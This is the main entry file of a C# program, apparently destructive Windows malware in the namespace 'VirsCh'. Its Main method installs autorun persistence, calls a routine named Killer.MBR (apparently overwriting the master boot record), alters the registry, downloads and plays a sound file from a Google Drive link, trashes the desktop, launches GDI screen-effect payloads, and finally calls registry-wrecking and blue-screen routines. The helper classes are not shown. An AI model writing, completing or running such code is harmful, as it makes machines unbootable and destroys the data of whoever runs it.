using System.IO;
using System.Media;
using System.Threading;

namespace VirsCh
{
    static class Program
    {
        static void Main()
        {

            if (!Addition.IsInstalledAR())
                Addition.InstallAR();
            Killer.MBR();
            Addition.RegFun();

            if (File.Exists(@"C:\Users\Public\Downloads\BG.wav"))
            {
                SoundPlayer back_snd = new SoundPlayer(@"C:\Users\Public\Downloads\BG.wav");
                back_snd.Play();
            } else
            {
                Misc.DownloadFileUrl("https://drive.google.com/uc?export=download&id=1hEGfM2a3CI__Zb1E9ra9o-Rk4UB_VG4J",
                "C:\\Users\\Public\\Downloads\\BG.wav");
                SoundPlayer back_snd = new SoundPlayer(@"C:\Users\Public\Downloads\BG.wav");
                back_snd.Play();
            }

            var rule = new Rules();
            new Thread(() => rule.ShowDialog()).Start();
            new Thread(() => Addition.TrashDestop()).Start();
            new Thread(() => Effect.GDI_payloads()).Start();
            Killer.RegFuck();
            Killer.BSOD();
        }
    }
}
